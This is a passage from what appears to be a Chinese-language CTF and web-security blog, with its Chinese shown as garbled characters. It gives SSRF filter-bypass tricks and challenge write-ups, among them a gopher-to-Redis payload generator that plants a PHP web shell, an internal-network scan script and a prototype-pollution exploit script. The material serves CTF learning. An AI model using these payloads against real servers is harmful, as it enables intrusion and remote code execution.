<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://xip.io/</span><br><span class="line">http://nip.io/</span><br><span class="line">https://ip6.name/</span><br><span class="line">https://sslip.io/</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>.xip.io/</span><br><span class="line"><span class="comment">#ç›¸å½“äº</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br></pre></td></tr></table></figure>

<ul>
<li>å°é—­å¼æ•°å­—å­—æ¯</li>
</ul>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://â‘ â‘¡â‘¦.â“ª.â“ª.â‘ </span><br><span class="line"><span class="comment">#ç›¸å½“äº</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/</span><br></pre></td></tr></table></figure>

<ul>
<li>çŸ­åœ°å€ç»•è¿‡</li>
</ul>
<p>é€šè¿‡çŸ­åœ°å€çš„æ–¹å¼æ¥ç»•è¿‡ï¼ŒçŸ­åœ°å€ç”Ÿæˆç½‘ç«™ï¼š<a href="https://tinyurl.com/">https://tinyurl.com/</a></p>
<h1 id="ssrfæ€ä¹ˆé˜²"><a href="#ssrfæ€ä¹ˆé˜²" class="headerlink" title="ssrfæ€ä¹ˆé˜²"></a><strong>ssrfæ€ä¹ˆé˜²</strong></h1><p>ç¦ç”¨ä¸éœ€è¦çš„åè®®ã€‚ä»…ä»…å…è®¸httpå’Œhttpsè¯·æ±‚ã€‚å¯ä»¥é˜²æ­¢ç±»ä¼¼äº <code>file://</code>, <code>gopher://</code>, <code>ftp://</code> ç­‰å¼•èµ·çš„é—®é¢˜ã€‚</p>
<h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a><strong>ä¾‹é¢˜</strong></h1><p>è¿™äº›é¢˜ç›®éƒ½æ˜¯ä»¥å‰å¤ç°çš„é¢˜ç›®ï¼Œå½“æ—¶çœ‹çš„äº‘é‡Œé›¾é‡Œï¼Œç°åœ¨å›å¤´æ¥çœ‹åˆåŠ æ·±äº†ç†è§£ã€‚</p>
<h2 id="SSRFçš„PHPé»‘é­”æ³•"><a href="#SSRFçš„PHPé»‘é­”æ³•" class="headerlink" title="SSRFçš„PHPé»‘é­”æ³•"></a><strong>SSRFçš„PHPé»‘é­”æ³•</strong></h2><p>è¿™æ˜¯hhhmå¸ˆå‚…å‡ºçš„é¢˜ç›®ä¸‰åº§å¤§å±±</p>
<p>åšè¿™é“é¢˜ç›®ä¹‹å‰å…ˆæ¥äº†è§£ä¸€ä¸‹SSRFçš„PHPé»‘é­”æ³•ï¼Œ<code>file_get_contents()</code>å‡½æ•°å¦‚æœè¾“å…¥ä¸€ä¸ªä¸å­˜åœ¨çš„åè®®åï¼Œä¼šçˆ†å‡ºä¸€ä¸ªwarningï¼Œç„¶åå¯¼è‡´ç›®å½•ç©¿è¶Šï¼Œä»è€Œå®ç°SSRFæ”»å‡»ï¼Œæ¯”å¦‚æˆ‘ä»¬è¯·æ±‚ä¸€ä¸ªPHPæ— æ³•è¯†åˆ«çš„åè®®ï¼Œæ¯”å¦‚<code>abc://</code>ï¼Œé‚£ä¹ˆä»–å°±ä¼šå°±è¢«PHPè¯†åˆ«ä¸ºäº†ä¸€ä¸ªç›®å½•ï¼Œå¦‚æœè¦è¯»å–åŒç›®å½•ä¸‹çš„index.phpï¼Œå°±è¦ç”¨<code>abc://../injiahsdex.php</code>æ¥è¿›è¡Œè¯»å–ã€‚è¿™æ ·åšçš„ç›®çš„å°±æ˜¯å¯ä»¥åœ¨SSRFçš„ä¼—å¤šåè®®è¢«bançš„æƒ…å†µä¸‹æ¥è¿›è¡Œè¯»å–æ–‡ä»¶ã€‚</p>
<p>å›åˆ°é¢˜ç›®ï¼Œé¦–å…ˆæŒ‰ç…§ç¤ºä¾‹è¾“å…¥oneï¼Œè¾“å‡ºä¸€å¼ é£æ™¯ç”»ï¼Œä¾ç…§æç¤ºå¯çŸ¥è¾“å…¥twoï¼ŒthreeåŒç†ä¼šæœ‰å›¾ç‰‡ï¼Œfuzzä¸€ä¸‹å‘ç°æœ‰æç¤ºï¼š</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">can you pass it and then read index.php? </span><br></pre></td></tr></table></figure>

<p>è¯»æ–‡ä»¶çš„è¯ä¸€èˆ¬æ˜¯ssrfï¼Œä»fuzzçš„ç»“æœä¼šå‘ç°è¾“å…¥åè®®ç›¸å…³çš„å†…å®¹å°±ä¼šè¢«è¿‡æ»¤æ‰ï¼Œå…¶ä¸­è¿‡æ»¤äº†å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:|https:|http:|gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:</span><br></pre></td></tr></table></figure>

<p>è¿™æ—¶å€™åˆ©ç”¨phpçš„é»‘é­”æ³•<code>abc://../index.php</code>å°±å¯ä»¥è¯»å–æœ¬åœ°çš„index.phpã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$name = $_GET[<span class="string">&quot;num&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($name))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>($name===<span class="string">&quot;one&quot;</span>||$name===<span class="string">&quot;two&quot;</span>||$name===<span class="string">&quot;three&quot;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $filename = <span class="string">&quot;tour/<span class="subst">$name</span>.php&quot;</span>;</span><br><span class="line">         <span class="keyword">echo</span> file_get_contents($filename);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">          <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/data:|https:|http:|gopher:|file:|phar:|php:|zip:|dict:|imap:|ftp:|input|filter|flag/i&#x27;</span>,$name))</span><br><span class="line">          &#123;</span><br><span class="line">            $url=file_get_contents($name);</span><br><span class="line">            <span class="keyword">echo</span>($url);</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;can you pass it and then read index.php? &quot;</span>);</span><br><span class="line">          &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#&lt;!---next c2Vzcw==.php--&gt; </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜ç›®åé¢è¿˜æœ‰ä¸€éƒ¨åˆ†æ— å‚æ•°ï¼Œä¸æ¶‰åŠSSRFè¿™é‡Œå°±ä¸æäº†ã€‚</p>
<h2 id="Redis-SSRF-getshell"><a href="#Redis-SSRF-getshell" class="headerlink" title="Redis SSRF getshell"></a><strong>Redis SSRF getshell</strong></h2><p>buué¢˜ç›®EZä¸‰å‰‘å®¢-EzWebï¼Œé¦–å…ˆå¾—åˆ°çš„é¡µé¢æ˜¯ä¸€ä¸ªè¾“å…¥æ¡†</p>
<p>å½“æˆ‘ä»¬è¾“å…¥<code>file:///etc/passwd</code>çš„æ—¶å€™ï¼Œä¸‹æ–¹æç¤ºåˆ«è¿™æ ·ï¼Œåº”è¯¥æ˜¯è¿‡æ»¤äº†fileåè®®ï¼Œè¿™é‡Œå¯ä»¥ä½¿ç”¨<code>file:&lt;ç©ºæ ¼&gt;///</code>ç»•è¿‡ï¼ŒæˆåŠŸå›æ˜¾ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šæœ‰SSRFæ¼æ´äº†ã€‚ç„¶åæˆ‘ä»¬å†ä½¿ç”¨fileåè®®è¯»å–æºç è¯•ä¸€ä¸‹ï¼Œåœ¨è¾“å…¥æ¡†è¾“å…¥<code>file: ///var/www/html/index.php</code>ï¼ŒæˆåŠŸè·å–æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;</span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">		$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">		<span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//var_dump($match);</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;åˆ«è¿™æ ·&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">	system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°ç»è¿‡äº†ä¸€ä¸ªæ­£åˆ™çš„åŒ¹é…æ‰å¯ä»¥<code>curl($url);</code>ã€‚</p>
<p>ä»æ­£åˆ™å¯ä»¥çœ‹å‡ºè¿‡æ»¤äº†<code>file://</code>ï¼Œ<code>dict</code>ï¼Œ<code>127.0.0.1</code>ï¼Œ<code>localhost</code>ï¼Œ<code>../</code>ä½†æ˜¯æ²¡æœ‰è¿‡æ»¤httpåè®®å’Œgopheråè®®ã€‚çœ‹åˆ°å¦‚æœgetä¼ å€¼secretä¼šæ‰§è¡Œifconfigã€‚</p>
<p>æŒ‰F12åœ¨æœ‰ä¸ªæ³¨é‡Šä¹Ÿå¯ä»¥å‘ç°?secretï¼Œè®¿é—®?secretå¾—åˆ°æœ¬æœºip</p>
<img src="http://img.kawhi.xyz/image-20200527114207278.png" style="high:80%;width:80%;" />

<p>å†™ä¸ªè„šæœ¬æ¢æµ‹å†…ç½‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ip = <span class="string">&#x27;173.17.51.&#123;&#125;&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://ac0d31a7-5126-4f26-a7ec-b38aceea896a.node3.buuoj.cn&#x27;</span></span><br><span class="line">temp = <span class="string">&quot;&#123;0&#125;/index.php?url=&#123;1&#125;&amp;&amp;submit=æäº¤&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">255</span>):</span><br><span class="line">    u = temp.format(url, ip.format(i))</span><br><span class="line">    resp = requests.get(u)</span><br><span class="line">    <span class="keyword">if</span> len(resp.text) != <span class="number">421</span>:</span><br><span class="line">    	print(i)</span><br></pre></td></tr></table></figure>

<p>è·‘å‡ºç»“æœ4 5 6 7 10 11ï¼Œä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œ11çš„æ—¶å€™ç»™å‡ºäº†æç¤ºï¼Œå½“ç„¶è¿™é‡Œä¸ç”¨å†™è„šæœ¬ï¼Œç”¨burpå»çˆ†ç ´ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p>
<p>è·å–åˆ°åœ°å€ä¹‹åï¼Œç„¶åç”¨burpçˆ†ç ´ç«¯å£ã€‚</p>
<img src="http://img.kawhi.xyz/image-20200527114920600.png" style="high:80%;width:80%;" />

<p>payloadsé€‰numbersçˆ†ç ´1åˆ°65535ç«¯å£ï¼Œçº¿ç¨‹é€‰1ã€‚ä¸€èˆ¬æ¥è¯´çŒœæµ‹æ˜¯6379ç«¯å£ï¼ˆredisï¼‰æˆ–3306ç«¯å£ï¼ˆmysqlï¼‰ï¼Œå½“ç„¶çˆ†ç ´å‡ºç»“æœæ˜¯6374ã€‚</p>
<p>å› ä¸ºè¾“å…¥urlè¿™é‡Œåªé™åˆ¶äº†<code>file://</code>ï¼Œæ²¡æœ‰banæ‰<code>gopher://</code>ï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°æ˜¯Redis SSRF getshellã€‚</p>
<p>è¿™é‡Œç›´æ¥ç”¨åˆ«äººå†™å¥½çš„expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.17.51.11&quot;</span></span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	print(payload)</span><br></pre></td></tr></table></figure>

<p>payloadä¸ºï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gopher://<span class="number">173.17</span><span class="number">.51</span><span class="number">.11</span>:<span class="number">6379</span>/_%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">248</span>%<span class="number">0</span>D%<span class="number">0</span>Aflushall%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A3%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">241</span>%<span class="number">0</span>D%<span class="number">0</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2432</span>%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>system%<span class="number">28</span>%<span class="number">22</span>cat%<span class="number">20</span>/flag%<span class="number">22</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">3</span>F%<span class="number">3</span>E%<span class="number">0</span>A%<span class="number">0</span>A%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Adir%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2413</span>%<span class="number">0</span>D%<span class="number">0</span>A/var/www/html%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A4%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">246</span>%<span class="number">0</span>D%<span class="number">0</span>Aconfig%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">243</span>%<span class="number">0</span>D%<span class="number">0</span>Aset%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2410</span>%<span class="number">0</span>D%<span class="number">0</span>Adbfilename%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">249</span>%<span class="number">0</span>D%<span class="number">0</span>Ashell.php%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">2</span>A1%<span class="number">0</span>D%<span class="number">0</span>A%<span class="number">244</span>%<span class="number">0</span>D%<span class="number">0</span>Asave%<span class="number">0</span>D%<span class="number">0</span>A</span><br></pre></td></tr></table></figure>

<p>åœ¨è¾“å…¥æ¡†ç›´æ¥æ‰“è¿›å»ã€‚ä¼šåœ¨æ ¹ç›®å½•ä¸‹ç”Ÿæˆä¸ªæ–‡ä»¶shell.phpï¼Œç„¶åè®¿é—®173.17.51.11/shell.phpå³å¯å¾—åˆ°flagã€‚</p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
  </entry>
  <entry>
    <title>ciscnåˆèµ›</title>
    <url>/2020/08/22/ciscn%E5%88%9D%E8%B5%9B/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a><strong>å‰è¨€</strong></h2><p>ä¸€æ¬¡èººèµ¢çš„æ¯”èµ›</p>
<p>ä¸€é˜Ÿwp:<a style="text-decoration:none;" class="foo" href="https://www.redmango.top/article/44" target="_blank">ä¼ é€é—¨</a></p>
<p>y1ngå¸ˆå‚…wp:<a style="text-decoration:none;" class="foo" href="https://www.gem-love.com/ctf/2569.html" target="_blank">ä¼ é€é—¨</a></p>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a><strong>easyphp</strong></h2><p>æºç ä¸º</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="comment">//é¢˜ç›®ç¯å¢ƒï¼šphp:7.4.8-apache</span></span><br><span class="line">   $pid = pcntl_fork();</span><br><span class="line">   <span class="keyword">if</span> ($pid == <span class="number">-1</span>) &#123;</span><br><span class="line">       <span class="comment">// åˆ›å»ºå­è¿›ç¨‹é”™è¯¯ï¼Œè¿”å›-1</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&#x27;could not fork&#x27;</span>);</span><br><span class="line">   &#125;<span class="keyword">else</span> <span class="keyword">if</span> ($pid)&#123;</span><br><span class="line">       <span class="comment">// çˆ¶è¿›ç¨‹ä¼šå¾—åˆ°å­è¿›ç¨‹å·ï¼Œæ‰€ä»¥è¿™é‡Œæ˜¯çˆ¶è¿›ç¨‹æ‰§è¡Œçš„é€»è¾‘</span></span><br><span class="line">       $r=pcntl_wait($status);</span><br><span class="line">       <span class="comment">// çˆ¶è¿›ç¨‹å¿…é¡»ç­‰å¾…ä¸€ä¸ªå­è¿›ç¨‹é€€å‡ºåï¼Œå†åˆ›å»ºä¸‹ä¸€ä¸ªå­è¿›ç¨‹ã€‚</span></span><br><span class="line">       <span class="keyword">if</span>(!pcntl_wifexited($status))&#123;<span class="comment">//æ£€æŸ¥çŠ¶æ€ä»£ç æ˜¯å¦ä»£è¡¨ä¸€ä¸ªæ­£å¸¸çš„é€€å‡ºã€‚</span></span><br><span class="line">           <span class="comment">//è¿”å›å€¼å½“å­è¿›ç¨‹çŠ¶æ€ä»£ç ä»£è¡¨æ­£å¸¸é€€å‡ºæ—¶è¿”å› TRUE ,å…¶ä»–æƒ…å†µè¿”å› FALSEã€‚</span></span><br><span class="line">           phpinfo();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">       highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">       <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string($_GET[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,$_GET[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">           call_user_func_array($_GET[<span class="string">&#x27;a&#x27;</span>],[$_GET[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">       &#125;</span><br><span class="line">       posix_kill(posix_getpid(), SIGUSR1);</span><br><span class="line">       <span class="comment">//å‘å½“å‰è¿›ç¨‹å‘é€SIGUSR1ä¿¡å·</span></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>ä¸»è¦æ˜¯æƒ³è¿›å…¥<code>phpinfo</code>è¿™é‡Œå­å¥é‡Œé¢ï¼Œä¹Ÿå°±æ˜¯è¦è®©<code>pcntl_wifexited($status)</code>ä¸ºFALSE</p>
<p>å¯ä»¥ç»™aä¼ <code>fsockopen</code>é€ æˆå¼‚æ­¥ï¼Œä½¿å¾—å½“å‰çº¿ç¨‹é€€å‡ºï¼Œçˆ¶çº¿ç¨‹å°±è¿è¡Œäº†<code>phpinfo</code></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://eci-2ze6ie6rtdjibnmrjlx4.cloudeci1.ichunqiu.com/?a=fsockopen&amp;b=1</span><br></pre></td></tr></table></figure>

<p>åœ¨phpinfoé¡µé¢å‘ç°flagã€‚</p>
<h2 id="littlegame"><a href="#littlegame" class="headerlink" title="littlegame"></a><strong>littlegame</strong></h2><p>ç»™äº†æºç é™„ä»¶ï¼Œå…³é”®ä»£ç å¦‚ä¸‹</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.post(<span class="string">&quot;/DeveloperControlPanel&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// not implement</span></span><br><span class="line">    <span class="keyword">if</span> (req.body.key === <span class="literal">undefined</span> || req.body.password === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.send(<span class="string">&quot;What&#x27;s your problem?&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> key = req.body.key.toString();</span><br><span class="line">        <span class="keyword">let</span> password = req.body.password.toString();</span><br><span class="line">        <span class="keyword">if</span>(Admin[key] === password)&#123;</span><br><span class="line">            res.send(process.env.flag);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.send(<span class="string">&quot;Wrong password!Are you Admin?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">router.get(<span class="string">&#x27;/SpawnPoint&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    req.session.knight = &#123;</span><br><span class="line">        <span class="string">&quot;HP&quot;</span>: <span class="number">1000</span>,</span><br><span class="line">        <span class="string">&quot;Gold&quot;</span>: <span class="number">10</span>,</span><br><span class="line">        <span class="string">&quot;Firepower&quot;</span>: <span class="number">10</span></span><br><span class="line">    &#125;</span><br><span class="line">    res.send(<span class="string">&quot;Let&#x27;s begin!&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.post(<span class="string">&quot;/Privilege&quot;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// Why not ask witch for help?</span></span><br><span class="line">    <span class="keyword">if</span>(req.session.knight === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/SpawnPoint&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.body.NewAttributeKey === <span class="literal">undefined</span> || req.body.NewAttributeValue === <span class="literal">undefined</span>) &#123;</span><br><span class="line">            res.send(<span class="string">&quot;What&#x27;s your problem?&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> key = req.body.NewAttributeKey.toString();</span><br><span class="line">            <span class="keyword">let</span> value = req.body.NewAttributeValue.toString();</span><br><span class="line">            setFn(req.session.knight, key, value);</span><br><span class="line">            res.send(<span class="string">&quot;Let&#x27;s have a check!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°è·¯ç”±<code>/DeveloperControlPanel</code>å¦‚æœ<code>Admin[key] === password</code>å°±ä¼šè¾“å‡º<code>flag</code>ï¼Œç„¶å</p>
<p>è·¯ç”±<code>/Privilege</code>å…ˆæ£€æŸ¥<code>req.session.knight </code>ï¼Œ<code>req.body.NewAttributeKey</code>ï¼Œ<code>req.body.NewAttributeValue</code>æ˜¯å¦æœªå®šä¹‰ï¼Œå½“ç„¶è¿™é‡Œçš„<code>key</code>å’Œ<code>value</code>éƒ½æ˜¯å¯æ§çš„ï¼Œç„¶åä¸‹é¢æœ‰ä¸ªå…³é”®ç‚¹å°±æ˜¯<code>setFn(req.session.knight, key, value);</code>è¿™é‡Œ<code>setFn</code>ç”¨äº†<code>require(&#39;set-value&#39;);</code>è¿™ä¸ªæ¨¡å—ã€‚ä¹Ÿå°±æ˜¯å¾€<code>req.session.knight</code>æ·»åŠ ä¸€ä¸ªé”®å€¼å¯¹ã€‚</p>
<p>è¿™é‡Œæƒ³åˆ°ç”¨åŸå‹é“¾æ±¡æŸ“ï¼Œè¿›è¡Œæ±¡æŸ“å¯¹è±¡åŸå‹ï¼Œä»è€Œå¯ä»¥ä¿®æ”¹Adminçš„keyå’Œpasswordã€‚</p>
<p>å…ˆè®¿é—®<code>/SpawnPoint</code>ç”Ÿæˆ<code>session</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">http://eci<span class="number">-2</span>ze9505q64pi62k5m16h.cloudeci1.ichunqiu.com:<span class="number">8888</span>/SpawnPoint</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨<code>Privilege</code>è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“ï¼Œå†åœ¨<code>/DeveloperControlPanel</code>è¾“å…¥å€¼å³å¯è·å–flagã€‚</p>
<p>expå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;__jsluid_h=b34fa3669aa578dc0618e3f9aa1c3a45; session=s:zvjsKzwgmvmxjeoGEWv8F5SimfB6LlQD.YrK/DLOjKSGHC2HJpOHGiV/cmaurt2/fpbrwMle3nLM&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">url = <span class="string">&quot;http://eci-2ze6ie6rtdji62dm1xo6.cloudeci1.ichunqiu.com:8888/Privilege&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;NewAttributeKey&quot;</span>:<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&quot;NewAttributeValue&quot;</span>:<span class="string">&#x27;__proto__.[abcd]&#x27;</span>&#125;</span><br><span class="line">r= requests.session()</span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eci-2ze6ie6rtdji62dm1xo6.cloudeci1.ichunqiu.com:8888/DeveloperControlPanel&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;key&quot;</span>:<span class="string">&#x27;abcd&#x27;</span>,<span class="string">&quot;password&quot;</span>:<span class="string">&#x27;abcd&#x27;</span>&#125;</span><br><span class="line">r= requests.session()</span><br><span class="line">r = requests.post(url,data=json.dumps(data),headers=headers)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>

